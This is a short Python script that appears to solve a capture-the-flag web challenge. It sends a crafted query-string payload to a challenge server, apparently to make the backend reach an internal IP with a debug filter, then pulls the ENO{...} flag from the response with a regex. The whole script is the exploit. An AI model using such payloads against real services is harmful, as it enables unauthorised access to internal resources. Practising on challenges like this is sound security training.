#!/usr/bin/env python3
import requests, re

SITE = "http://52.59.124.14:10019/"
PAYLOAD = "fetch_backend&bip=192.168.112.02&debug_filter"
REGEX = r"ENO{.*?}"

r = requests.get(SITE + "?" + PAYLOAD)
flag = re.findall(REGEX, r.text)[0]
print(flag) # ENO{Another_Fl4G_something_IP_STuff!}